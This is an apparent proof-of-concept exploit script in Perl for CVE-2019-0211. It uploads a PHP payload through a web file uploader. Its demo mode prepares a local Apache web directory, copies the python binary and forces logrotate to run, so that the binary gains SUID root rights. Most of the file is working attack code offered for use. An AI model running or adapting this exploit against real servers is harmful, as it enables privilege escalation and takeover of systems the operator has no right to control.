#!/usr/bin/perl

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use Term::ANSIColor qw(colored color);
use Scalar::Util qw(reftype);
use JSON::Parse qw(json_file_to_perl);
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common;
use HTTP::Cookies;
use HTTP::Response;
use Getopt::Long;

# Global Variables
my $DEBUG   = 0;
my $VERBOSE = 0;

# Display The Header
header();

# Run The PoC
exploit();

sub header {
    print "\n\n";
    my $title = "=================================[ CVE-2019-0211 ]=================================";

    print qq{
$title
};
}

sub Help {
    print "\n";
    print qq {  
        # Usage
            perl $0 <USAGE> [OPTIONS]

        # Arguments
            --url [VALUE]	            : The Uploader URL [Format: scheme://host]
            --parameter [VALUE]	        : The file parameter used by the uploader
            --file [VALUE]	            : The file to upload
            --binary [VALUE]	        : The binary to suid path
            --user-agent [VALUE]	    : User-Agent To Send To Server
            --cookie [VALUE]	        : Cookie String To Use
            --proxy [VALUE]	            : Proxy Server To Use [Format: scheme://host:port]
            --timeout [VALUE]	        : Max Timeout For The HTTP Requests
            --auth [VALUE]	            : Credentials To Use For HTTP Login [Format: username:password]
            --help                      : Display The Help Menu
            --verbose                   : Be More Verbose
            --debug                     : Debug Mode
            --requests-file [VALUE]	    : JSON Requests File To Use
            --requestbin_url [VALUE]	: The url to request to check exploitability .
    };
    print "\n\n";
    exit;
}

sub buildRequester {
    my $browser     = 0;
    my $cookie_jar  = 0;
    my $cookie_file = "cookies.lwp";

    result("Cookie file: $cookie_file");
    $cookie_jar = HTTP::Cookies->new(
        file     => $cookie_file,
        autosave => 1,
    );

    $browser = LWP::UserAgent->new();
    $browser->protocols_allowed( [qw( http https ftp )] );
    $browser->requests_redirectable( [ 'GET', 'PUT', 'DELETE', 'POST', 'HEAD', 'OPTIONS' ] );
    $browser->cookie_jar($cookie_jar);

    return $browser;
}

sub buildRequest {
    my ( $url, $method, $query, $data, $file_parameter, $file ) = @_;
    $query = '' if ( !defined($query) || !$query );
    $data  = '' if ( !defined($data)  || !$data );
    $file_parameter  = '' if ( !defined($file_parameter)  || !$file_parameter );
    $file  = '' if ( !defined($file)  || !$file );
    $method = uc($method);
    my $request = 0;

    if ($query) {
        $query = '?' . $query;
    }

    if ($method eq "GET") {
        $request = HTTP::Request->new($method, $url . $query );
    } else {
        $request = HTTP::Request->new($method, $url . $query );
        print "$file_parameter\n$file\n";
        if($file_parameter && $file) {
            if(-f $file) {
			$request = POST $url . $query, Content_Type => 'multipart/form-data', Content => ["$file_parameter" => [$file]];

            } else {
                die(error("Couldn't read file: $file"));
            }
        } elsif($data) {
            $request->content($data);
            $request->content_length( length($data) );
        }
    }

    return $request;
}

sub rnd {
    return join '', @_[ map { rand @_ } 1 .. shift ];
}

sub randnumber {
    my ($size) = @_;
    $size = rnd( 1, "1" .. "9" ) if ( !defined($size) );
    my $number = 0;

    if ( $size > 1 ) {
        $number = rnd( 1, "1" .. "9" ) . rnd( $size - 1, "0" .. "9" );
    }
    else {
        $number = rnd( $size, "0" .. "9" );
    }

    return $number;
}

sub randstr {
    my ( $type, $size ) = @_;
    $size = rnd( 1, "1" .. "9" ) if ( !defined($size) );
    $type = 0 if ( !defined($type) );

    if ($type) {
        if ( $type =~ /^lower(?:case)?$|^lc?$/i ) {
            return rnd( $size, "a" .. "z" );
        }
        elsif ( $type =~ /^uc?$|upper(?:case)?/i ) {
            return rnd( $size, "A" .. "Z" );
        }
        else {
            return rnd( $size, "a" .. "z", "A" .. "Z" );
        }
    }
    else {
        return rnd( $size, "a" .. "z", "A" .. "Z" );
    }
}

sub fuzzString {
    my ( $string, $fuzzing_variables ) = @_;
    my $final_string = $string;
    return "" if(!$final_string);

    my $randnum      = randnumber(4);
    my $randstr      = randstr( 'lc', 5 );

    $final_string =~ s/(?:\_\_|\{\{|###)RANDSTR[0-9]?(?:\_\_|\}\}|###)/$randstr/gi;
    $final_string =~ s/(?:\_\_|\{\{|###)RANDNUM[0-9]?(?:\_\_|\}\}|###)/$randnum/gi;

    foreach my $replacement ( keys %{$fuzzing_variables} ) {
        my $fuzz_value = "";

        if ( !reftype( $fuzzing_variables->{$replacement} ) ) {
            $fuzz_value = $fuzzing_variables->{$replacement};
        }
        $final_string =~ s/(?:\_\_|\{\{|###)$replacement(?:\_\_|\}\}|###)/$fuzz_value/gi;
    }

    return $final_string;
}

sub exploit {
    my $ARGUMENTS = {};

    my $demo       = 0;
    my $browser    = 0;
    my $response   = 0;
    my $vulnerable = 1;

    $ARGUMENTS->{'timeout'}        = 30;                                                                                      # Command Argument : timeout
    $ARGUMENTS->{'proxy'}          = 0;                                                                                       # Command Argument : proxy
    $ARGUMENTS->{'requestbin_url'} = 0;                                                                                       # Command Argument : requestbin_url
    $ARGUMENTS->{'auth'}           = 0;                                                                                       # Command Argument : auth
    $ARGUMENTS->{'useragent'}      = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0";    # Command Argument : user-agent
    $ARGUMENTS->{'url'}            = 0;                                                                                       # Command Argument : url
    $ARGUMENTS->{'parameter'}      = "image";
    $ARGUMENTS->{'file'}           = "files/payloads/payload.php";
    $ARGUMENTS->{'binary'}         = "/usr/bin/python";
    $ARGUMENTS->{'user'}           = "evil";
    $ARGUMENTS->{'cookie_string'}  = 0;                                                                                       # Command Argument : cookie
    $ARGUMENTS->{'requests_file'}  = "requests.json";
    $ARGUMENTS->{'web_root_path'}  = "/usr/local/httpd-2.4.29/htdocs/";

    GetOptions(
        "timeout=i"        => \$ARGUMENTS->{'timeout'},
        "proxy=s"          => \$ARGUMENTS->{'proxy'},
        "help!"            => \&Help,
        "requestbin_url=s" => \$ARGUMENTS->{'requestbin_url'},
        "auth=s"           => \$ARGUMENTS->{'auth'},
        "user-agent=s"     => \$ARGUMENTS->{'useragent'},
        "url=s"            => \$ARGUMENTS->{'url'},
        "binary=s"         => \$ARGUMENTS->{'binary'},
        "webroot=s"        => \$ARGUMENTS->{'web_root_path'},
        "user=s"           => \$ARGUMENTS->{'user'},
        "parameter=s"      => \$ARGUMENTS->{'parameter'},
        "file=s"           => \$ARGUMENTS->{'file'},
        "cookie=s"         => \$ARGUMENTS->{'cookie_string'},
        "debug!"           => \$ARGUMENTS->{'DEBUG'},
        "demo!"            => \$demo,
        "requests-file=s"  => \$ARGUMENTS->{'requests_file'},
        "verbose!"         => \$ARGUMENTS->{'VERBOSE'},
    ) or error("Bad Value(s) Provided In Command Line Arguments");

    ### Required Arguments

    if($demo) {
        if(-d $ARGUMENTS->{'web_root_path'}) {
            $ARGUMENTS->{'binary'} = "/usr/bin/python_cve_2019_0211";
            $ARGUMENTS->{'url'} = "http://127.0.0.1/CVE-2019-0211";
            my $web_directory = $ARGUMENTS->{'web_root_path'} . "/CVE-2019-0211";
            my $uploader_url = $ARGUMENTS->{'url'} . "/upload.php";

            info("Creating the web directory ...");
            system("sudp mkdir -p $web_directory");
            system("sudo chown " . $ARGUMENTS->{'user'} . " -R $web_directory");
            system("chmod 0777 -R $web_directory");
            system("chmod +x -R $web_directory");
            success("Web directory created: $web_directory");

            info("Copying the web files ...");
            system("cp -r files/www/html/* $web_directory");
            success("Web files copied. Uploader: $uploader_url");

            info("Copying python binary to try to SuID it ...");
            system("sudo cp /usr/bin/python " . $ARGUMENTS->{'binary'});
            system("sudo chown " . $ARGUMENTS->{'user'} . " " . $ARGUMENTS->{'binary'});
            success("Binary created: " . $ARGUMENTS->{'binary'});


            info("Showing current rights of binary: " . $ARGUMENTS->{'binary'});
            system("ls -alh " . $ARGUMENTS->{'binary'});
        } else {
            die(error("Wrong web root path: " . $ARGUMENTS->{'web_root_path'} . " ."));
        }
        # $ sudo /usr/sbin/logrotate /etc/logrotate.conf --force
        # $ ls -alh /usr/bin/python3.5
        # -rwsr-sr-x 2 root root 4.6M Sep 27  2018 /usr/bin/python3.5
    } elsif(!$ARGUMENTS->{'url'}) {
        die(error("Missing uploader url (--url) ."));
    }

    if ( $ARGUMENTS->{url} =~ /https?:\/\/[^\/]*\/[a-zA-Z0-9\-\.\_\/\\]+/i ) {
        ( $ARGUMENTS->{base_url}, $ARGUMENTS->{base_path} ) = $ARGUMENTS->{url} =~ /(https?:\/\/[^\/]*)(\/[^\?]*)/i;
    }

    ### Setting Up The Requester
    $browser = buildRequester();

    ### Custom Options
    $browser->timeout( $ARGUMENTS->{timeout} );
    $browser->agent( $ARGUMENTS->{useragent} );
    $browser->default_header( 'Cookie' => $ARGUMENTS->{cookie_string} ) if ( $ARGUMENTS->{cookie_string} );

    if ( $ARGUMENTS->{proxy} ) {
        if ( $ARGUMENTS->{proxy} =~ /[a-z]+:\/\/(?:\d+\.\d+\.\d+\.\d+|[a-zA-Z0-9\-\_]+\.[a-zA-Z\.]+):[0-9]+/i ) {
            result( "Proxy: " . $ARGUMENTS->{proxy} );
            $browser->proxy( [qw( http https ftp ftps )] => $ARGUMENTS->{proxy} );
        }
        else {
            error("Wrong Proxy String Given, Use Format : scheme://host:port");
        }
    }


    ### Build/send the requests
    if ( -f $ARGUMENTS->{requests_file} ) {
        my $requests_data = json_file_to_perl( $ARGUMENTS->{requests_file} );

        foreach my $request_name ( keys %{$requests_data} ) {
            info( $requests_data->{$request_name}->{text} ) if ( defined( $requests_data->{$request_name}->{text} ) && $requests_data->{$request_name}->{text} );

            my $request = buildRequest($ARGUMENTS->{url} . $requests_data->{$request_name}->{path}, $requests_data->{$request_name}->{method}, fuzzString($requests_data->{$request_name}->{query}, $ARGUMENTS), fuzzString($requests_data->{$request_name}->{data}, $ARGUMENTS), fuzzString($requests_data->{$request_name}->{parameter}, $ARGUMENTS), fuzzString($requests_data->{$request_name}->{file}, $ARGUMENTS));
            info( "(" . $request->method . ")", $request->uri ) if ( $ARGUMENTS->{VERBOSE} || $ARGUMENTS->{DEBUG} );

            if ( defined( $requests_data->{$request_name}->{headers} ) && reftype( $requests_data->{$request_name}->{headers} ) eq 'HASH' ) {
                foreach my $header_name ( sort keys %{ $requests_data->{$request_name}->{headers} } ) {
                    if ( lc($header_name) eq 'content-type' ) {
                        $request->content_type( $requests_data->{$request_name}->{headers}->{$header_name} );
                    }
                    else {
                        $request->header( $header_name => fuzzString( $requests_data->{$request_name}->{headers}->{$header_name}, $ARGUMENTS ) );
                    }
                }
            }

            $response = $browser->request($request);
            displayRequest($response) if ( $ARGUMENTS->{DEBUG} );

            if ( defined( $requests_data->{$request_name}->{validation} ) && reftype( $requests_data->{$request_name}->{validation} ) eq 'HASH' ) {
                foreach my $validation_mode ( sort keys %{ $requests_data->{$request_name}->{validation} } ) {
                    if ( reftype( $requests_data->{$request_name}->{validation}->{$validation_mode} ) eq 'ARRAY' && 0 + @{ $requests_data->{$request_name}->{validation}->{$validation_mode} } ) {
                        foreach my $validation_value ( @{ $requests_data->{$request_name}->{validation}->{$validation_mode} } ) {
                            last if ( validate( $validation_mode, $validation_value, $response ) );
                        }
                    }
                }
            }
            else {
                warning("Any validation method provided for request: " . $request_name );
            }
        }
    } else {
        error("Missing requests file: " . $ARGUMENTS->{requests_file});
    }

    if($demo) {
		info("Runnig logrotate ...");
		system("/usr/sbin/logrotate /etc/logrotate.conf --force");

    	info("Showing new rights of binray: " . $ARGUMENTS->{'binary'});
	    system("ls -alh " . $ARGUMENTS->{'binary'});
    }
}

sub validate {
    my ( $validation_mode, $validation_value, $response ) = @_;
    my $value        = 0;
    my $positive     = 1;
    my $status       = "FAILED";
    my $status_color = "red";
    my $type         = substr( $validation_mode, 1, length($validation_mode) );

    $positive = 0 if ( substr( uc($validation_mode), 0, 1 ) eq 'F' );

    given ( substr( $validation_mode, 1, length($validation_mode) ) ) {

        when (/CODE/i) { $value = $response->code; }

        when (/SIZE/i) { $value = length( $response->content ); }

        when (/STRING|REGEX/i) { $value = $response->content; }

        when (/HEADER/i) {
            my @header_parts = split( ':', $validation_value );

            if ( $header_parts[0] ) {
                if ( $response->header( $header_parts[0] ) ) {
                    if ( $header_parts[1] ) {
                        return $positive if ( $response->header( $header_parts[0] ) =~ $header_parts[1] );
                    }
                    else {
                        return $positive;
                    }
                }
                else {
                    warning( "Expected : " . $header_parts[0] . " Not Found In Response Headers" );
                    return 0;
                }
            }
            else {
                return 0;
            }
        }
    }

    if ( $validation_value && $validation_value =~ /$value/i || $validation_value eq $value ) {
        if ( $VERBOSE || $DEBUG ) {
            if ($positive) {
                $status       = "SUCESS";
                $status_color = "green";

                print color("white") . "   [" . color("magenta") . "V" . color("white") . "]" . color("blue") . "( " . color("$status_color") . $status . color("blue") . " ) [Validation] Expected : " . color("cyan") . "$validation_value" . color("blue") . ", Got : " . color("cyan") . "$value\n";
            }
        }

        return $positive;
    }

    return 0;
}

sub displayRequest {
    my ($response) = @_;
    my $request = $response->request;

    ### Request
    print "\n\n" . color("yellow") . "⟶ " . color("blue") . uc( $request->method ) . color("cyan") . ' ' . $request->uri->path . color("white") . " HTTP/1.1\n";
    print color("yellow") . "⟶ " . color("white") . "Host: " . color("cyan") . $request->uri->host . "\n";

    foreach my $header_name ( keys %{ $request->headers } ) {
        my @headers_values = ();
        push( @headers_values, $request->header($header_name) );

        foreach my $header_value (@headers_values) {
            print color("yellow") . "⟶ " . color("white") . $header_name . ": " . color("cyan") . $header_value . "\n";
        }
    }

    if ( $request->content ) {
        print color("yellow") . "⟶ " . color("white") . $request->content . "\n";
    }
    print "\n\n";

    print color("green") . "<-- " . color("white") . "HTTP/1.1 " . color("cyan") . $response->status_line . "\n";

    foreach my $header_name ( keys %{ $response->headers } ) {
        next if ( $header_name eq '::std_case' );

        my @headers_values = ();
        push( @headers_values, $response->header($header_name) );

        foreach my $header_value (@headers_values) {
            print color("green") . "<-- " . color("white") . $header_name . ": " . color("cyan") . $header_value . "\n";
        }
    }
    print "\n" . color("white") . $response->decoded_content . "\n";
}

sub info {
    if ( $_[0] ) {
        if ( $_[1] ) {
            if ( $_[2] ) {
                print color("blue") . "[" . color("dark blue") . $_[0] . color("blue") . "] " . color("yellow") . $_[1] . color("white") . " " . color("cyan") . " " . $_[2] . "\n";
            }
            else {
                print color("blue") . "[" . color("dark blue") . $_[0] . color("blue") . "] " . color("cyan") . $_[1] . "\n";
            }
        }
        else {
            print colored( "[INFO] ", "blue" ) . color("white") . " " . color("cyan") . $_[0] . "\n";
        }
    }
}

sub result {
    if ( $_[0] ) {
        if ( $_[1] ) {
            if ( $_[2] ) {
                print color("white") . "[" . color("bold green") . "✔ " . color("dark blue") . $_[0] . color("white") . "]" . color("bold green") . " " . $_[1] . color("white") . ": " . color("cyan") . $_[2] . "\n";
            }
            else {
                print color("white") . "[" . color("bold green") . "✔" . color("white") . "]" . color("bold green") . " " . $_[0] . color("white") . ": " . color("cyan") . $_[1] . "\n";
            }
        }
        else {
            print color("white") . "[" . color("bold green") . "✔" . color("white") . "]" . color("bold green") . " SUCCESS" . color("white") . ": " . color("cyan") . $_[0] . "\n";
        }
    }
}

sub success {
    my ($text) = @_;
    print color("white") . "[" . color("bold green") . "✔" . color("white") . "]" . color("bold green") . " SUCCESS" . color("white") . ": " . color("cyan") . "$text\n";
}

sub warning {
    my ($text) = @_;
    print STDERR color("white") . "[" . color("yellow") . "☢" . color("white") . "]" . color("yellow") . " WARNING" . color("white") . ": " . color("cyan") . "$text\n";
}

sub error {
    my ( $text, $exit ) = @_;
    $exit = 1 if ( !defined($exit) );
    print STDERR color("white") . "\t\t[" . color("red") . "✖" . color("white") . "]" . color("red") . " ERROR" . color("white") . ": " . color("cyan") . "$text\n";
    exit if ($exit);
}

